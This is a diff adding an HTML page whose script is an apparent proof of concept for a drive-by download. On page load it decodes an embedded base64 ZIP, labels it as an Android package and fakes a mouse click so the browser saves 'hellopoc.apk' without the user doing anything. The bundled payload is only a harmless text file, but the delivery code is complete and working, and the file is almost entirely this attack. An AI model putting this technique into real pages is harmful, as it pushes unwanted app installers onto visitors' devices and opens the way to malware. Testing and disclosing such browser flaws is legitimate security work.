@@ -1,0 +1,80 @@
+<!DOCTYPE html><html><head></head><body>
+<script type = "text/javascript">
+try
+{
+    // create/import saveAs function if nesessary
+    window["saveAs"]||(window["saveAs"] = (window["navigator"]["msSaveBlob"] ?
+        function (bi123, ni123) {
+            return window["navigator"]["msSaveBlob"](bi123, ni123); 
+        } : false) || window["webkitSaveAs"] || window["mozSaveAs"] || window["msSaveAs"]|| (
+            function () {
+                window["URL"] || (window["URL"] = window["webkitURL"]); 
+                if (!window["URL"])
+                    return  false ;
+                    
+                return function (blob123, name123) {
+                    var url123 = URL.createObjectURL(blob123); 
+                    var dwn123 = "download";
+                    if (dwn123 in document.createElement("a"))
+                    {
+                        var pocHref = document.createElement("a");
+                        pocHref.setAttribute("href", url123);
+                        pocHref.setAttribute("download",name123); 
+                        var mouseEvent = document.createEvent("MouseEvent"); 
+                        try
+                        {
+                            mouseEvent.initMouseEvent("click", true, true, window, 0, event["screenX"],
+                               event["screenY"], event["clientX"], event["clientY"], event["ctrlKey"],
+                               event["altKey"], event["shiftKey"], event["metaKey"], 0, null ); 
+                            pocHref.dispatchEvent(mouseEvent); 
+                        }
+                        catch (e)
+                        {
+                            alert(e)
+                        }
+                    }
+                    else 
+                    {
+                        window.open(url123, "_blank",''); 
+                    }
+                }; 
+            }
+        )
+    ());
+
+    
+    var splitSize = 1024;
+    // payload is ZIP with a text file
+    var dataBytes = atob("UEsDBAoAAAAAAPWVH0nNLMkIEQAAABEAAAAHAAAAcG9jLnR4dEkgQU0gWU9VUiBGQVRIRVIhUEsBAhYACgAAAA"+
+                         "AA9ZUfSc0syQgRAAAAEQAAAAcAAAAAAAAAAQAgAAAAAAAAAHBvYy50eHRQSwUGAAAAAAEAAQA1AAAANgAAAAAA"); 
+    // split payload
+    var dataLength = dataBytes.length; 
+    var slicesCount = Math.ceil(dataLength/splitSize); 
+    var slices = new Array(slicesCount); 
+    for (var sliceIndex = 0; sliceIndex<slicesCount; ++sliceIndex)
+    {
+        var begin123 = sliceIndex*splitSize; 
+        var PoC_around = Math.min(begin123 + splitSize,dataLength); 
+        var bytes123 = new Array(PoC_around-begin123); 
+        for (var offset123 = begin123,i = 0; offset123<PoC_around; ++i,++offset123)
+            bytes123[i] = dataBytes[offset123].charCodeAt(0); 
+        slices[sliceIndex] = new Uint8Array(bytes123); 
+    }
+
+    // create blob
+    var blob  =  new Blob(slices, {type : 'application/vnd.android.package-archive'});
+    // save blob to file on load event
+    window.addEventListener("load", function () {
+            window.saveAs(blob, "hellopoc.apk");
+        }, false ); 
+    
+}
+catch (err)
+{
+    alert(err);
+}
+
+</script>
+</body>
+</html>
+
